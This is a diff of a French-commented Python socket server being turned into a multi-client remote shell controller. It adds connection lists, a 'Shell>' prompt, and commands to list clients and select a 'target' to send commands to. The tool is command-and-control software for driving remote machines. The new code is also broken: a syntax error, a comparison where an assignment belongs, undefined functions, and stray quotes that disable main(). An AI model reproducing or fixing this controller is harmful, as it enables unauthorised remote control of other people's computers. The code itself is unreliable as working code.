@@ -1,5 +1,13 @@
 import socket #pour la connection
 import sys #pour les commandes systèmes
+import threading # pour que le serveur puisse gérer plusieurs client à la fois
+from queue import Queue
+
+THREADS = 2 # Nombre de thread
+NUMBER = [1, 2] # thread 1 et 2 -> dans une liste
+queue = Queue()
+connections = [] # liste1 = ce qui se rapporte à la connection elle même
+addresses = [] #liste2 = ce qui se rapporte au adresse ip, quel client se connecte, ...
 
 # Créer un socket pour initier une connection
 def socket_creation():
@@ -7,7 +15,7 @@ def socket_creation():
         global host #variable global pour être utilisée plus tard dans une autre fonction
         global port
         global sock
-        host = '' #l'ip ou le sever sera à l'écoute (lui même dans ce cas)
+        host = '192.168.1.12' #l'ip ou le sever sera à l'écoute (lui même dans ce cas)
         port = 9999 #le port sur lequel il sera à l'écoute pour recevoir des infos
         sock = socket.socket()
     except socket.error as msg: #Si la création du socket échoue on renvoit le message suivant
@@ -26,13 +34,58 @@ def socket_bind():
         print("socket binding error: ", + str(msg) + "\n" + "Please retry ...")
         socket_bind() #donc si erreur, on relance la fonction !
 
-# Accepter la connection avec le client
+# Accepter la connection avec les clients et les sauvegarde sous forme de liste
 def accept_socket():
+    for c in connections:  # Fermer toutes les connections
+        c.close()
+    del connections[:]  # être sur de démmarer sur une bonne base en nettoyant toutes les connections et adresses
+    del addresses[:]
+    while 1:
+        try:
+            conn, address = sock.accept()
+            conn.setblocking(1)  #pas de "timeout"
+            connections.append(conn)  #ajout des connections et adresses à leur liste
+            addresses.append(address)
+            print("\nConnection established on " + address[0] + ":" + address[1])  #Affiche l'IP et le PORT
+        except:
+            print("Error while accepting the connection ...")
+
+
+    """
     conn, address = sock.accept() #attendre que la connection se fasse et afficher le message qui suit avec les infos sur l'ip et le port du client
     print("Connection established on " + "IP " + address[0] + ":" + str(address[1]))
     send_commands(conn) #Fonction qui permettra d'envoyer des commandes
     conn.close()
+    """
 
+# Shell
+def start_prompt():
+    while True:
+        cmd = input('Shell> ')
+        if == 'lstc':
+            list_connection()  #Liste les connections
+            continue
+        elif 'select' in cmd:
+            conn == get_trgt(cmd)  #Selectionne une cible dans la liste des connections grâce à un index
+            if conn is not None:
+                send_trgt_cmd(conn)
+        else:
+            print("Command not found ! Try another one or \"help\"")
+
+# Montre les connections actives
+def list_connection():
+    result = ''
+    for i, conn in enumerate(connections): #enumerate permet de ne pas utiliser d'indices
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(20480)  # gros buffer car bcp d'infos
+        except:  # Au cas ou il y aurait une mauvaise connection
+            del connections[i]
+            del addresses[i]
+            continue
+        result += str(i) + '   ' + str(addresses[i][0]) + ':' + str(addresses[i][1]) + '\n'
+    print("###### List of Clients ######" + "\n" + result)
+"""
 def send_commands(conn):
     while True: #connection constante (boucle infinie)
         cmd = input()
@@ -51,3 +104,5 @@ def main(): #creation d'une fonction qui contient chaque étape (sauf l'envoie d
     accept_socket()
 
 main() #Appel de la fonction principale
+"""
+
